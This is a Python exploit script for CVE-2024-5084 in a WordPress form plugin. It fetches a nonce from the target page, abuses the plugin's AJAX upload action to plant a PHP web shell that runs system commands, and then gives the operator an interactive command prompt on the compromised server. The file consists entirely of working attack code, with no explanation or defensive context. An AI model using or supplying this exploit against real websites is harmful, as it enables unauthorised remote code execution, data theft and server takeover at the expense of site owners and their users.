import re
import sys
import argparse
import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

def getNonce(url):
    response_text = requests.get(url).text
    nonce = re.findall(r'"ajax_nounce":"(.*?)"', response_text)[0]
    if (nonce):
        print(f"[+] Nonce: {nonce}")
        return nonce
    else:
        print(f"[-] Can't find nonce")
        exit()

def fileUpload(url):
    php_file = '''<?php system($_GET["cmd"]); ?>'''
    headers = {"User-Agent": "Mozilla/5.0 (Linux; rv:124.0)"}
    params = {
        "action": "hashform_file_upload_action",
        "file_uploader_nonce": getNonce(url),
        "allowedExtensions[0]": "php",
        "sizeLimit": 1048576,
        "qqfile": "CVE-2024-5084_Exploit.php",
    }

    response = requests.post(
        f"{url}/wp-admin/admin-ajax.php", 
        headers = headers, 
        params = params, 
        data = php_file, 
        verify = False
    )

    uploadURL = response.json().get("url")
    if (uploadURL):
        print(f"[+] File Upload at {uploadURL}")
        return uploadURL
    else:
        print(f"[-] File Uplaod Fail !")


def connectSession(url):
    uploadURL = fileUpload(url)
    session = PromptSession(history=InMemoryHistory())
    while True:
        cmd = session.prompt(HTML("$ ")).strip()
        if cmd.lower() == "exit":
            exit()
        if cmd.lower() == "clear":
            sys.stdout.write("\x1b[2J\x1b[H")
            continue

        response = requests.get(f"{uploadURL}?cmd={cmd}", verify=False)
        response.raise_for_status()
        print(f"{response.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Submit a host address and port of the WordPress.")
    parser.add_argument("-u", type=str, required=True, help="The host address of the WordPress. Format: http(s)://<ip>")
    parser.add_argument("-p", type=str, required=True, help="The port of the WordPress.", default=80)
    args = parser.parse_args()
    
    url = f"{args.u}:{args.p}"

    connectSession(url)